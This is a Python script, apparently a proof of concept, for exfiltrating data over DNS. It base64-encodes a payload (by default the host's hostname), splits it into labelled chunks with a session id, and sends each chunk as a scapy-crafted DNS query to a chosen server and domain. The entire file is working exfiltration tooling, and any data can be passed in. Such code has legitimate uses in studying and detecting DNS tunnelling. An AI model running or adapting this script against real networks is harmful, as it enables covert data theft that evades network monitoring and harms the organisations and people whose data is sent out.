# Information is being taken from the below notable sources:
# https://unit42.paloaltonetworks.com/dns-tunneling-how-dns-can-be-abused-by-malicious-actors/
# https://techwithrohit.medium.com/dns-exfiltration-what-and-how-of-it-dc2dd70f0337

import argparse
import base64
import subprocess
import uuid

MAX_DNS_LABEL_LENGTH = 63
CHUNK_LABEL_LENGTH = 50


def get_default_payload():
    return subprocess.check_output(["hostname"], text=True).strip()


def encode_payload(payload):
    encoded = base64.urlsafe_b64encode(payload.encode()).decode()
    return encoded.rstrip("=")


def chunk_payload(encoded_payload, chunk_size=CHUNK_LABEL_LENGTH):
    return [
        encoded_payload[index : index + chunk_size]
        for index in range(0, len(encoded_payload), chunk_size)
    ]


def build_query_name(session_id, chunk_index, chunk_total, chunk, domain):
    labels = [session_id, str(chunk_index), str(chunk_total), chunk]
    labels.extend(domain.strip(".").split("."))

    oversized = [label for label in labels if len(label) > MAX_DNS_LABEL_LENGTH]
    if oversized:
        raise ValueError(f"DNS label is too long: {oversized[0]}")

    return ".".join(labels)


def send_query(server, port, query_name, timeout):
    try:
        from scapy.all import DNS, DNSQR, IP, UDP, RandShort, sr1
    except ModuleNotFoundError as error:
        raise SystemExit(
            "Scapy is required to send DNS packets. Install it with: pip install scapy"
        ) from error

    return sr1(
        IP(dst=server)
        / UDP(sport=RandShort(), dport=port)
        / DNS(rd=1, qd=DNSQR(qname=query_name, qtype="A")),
        timeout=timeout,
        verbose=False,
    )


def parse_args():
    parser = argparse.ArgumentParser(
        description="Send a small DNS exfiltration proof-of-concept query."
    )
    parser.add_argument(
        "-s",
        "--server",
        default="127.0.0.1",
        help="DNS server IP to query. Defaults to 127.0.0.1.",
    )
    parser.add_argument(
        "-P",
        "--port",
        type=int,
        default=53,
        help="DNS server UDP port to query. Defaults to 53.",
    )
    parser.add_argument(
        "-d",
        "--domain",
        default="testing.com",
        help="Authoritative domain suffix to query. Defaults to testing.com.",
    )
    parser.add_argument(
        "-p",
        "--payload",
        default=None,
        help="Payload to exfiltrate. Defaults to the local hostname.",
    )
    parser.add_argument(
        "--timeout",
        type=float,
        default=2.0,
        help="Seconds to wait for each DNS response. Defaults to 2.",
    )
    return parser.parse_args()


def main():
    args = parse_args()
    payload = args.payload if args.payload is not None else get_default_payload()
    encoded_payload = encode_payload(payload)
    chunks = chunk_payload(encoded_payload)
    session_id = uuid.uuid4().hex[:8]

    print(f"Sending {len(chunks)} chunk(s) for session {session_id}")
    for chunk_index, chunk in enumerate(chunks):
        query_name = build_query_name(
            session_id=session_id,
            chunk_index=chunk_index,
            chunk_total=len(chunks),
            chunk=chunk,
            domain=args.domain,
        )
        print(f"Querying: {query_name}")
        send_query(args.server, args.port, query_name, args.timeout)


if __name__ == "__main__":
    main()
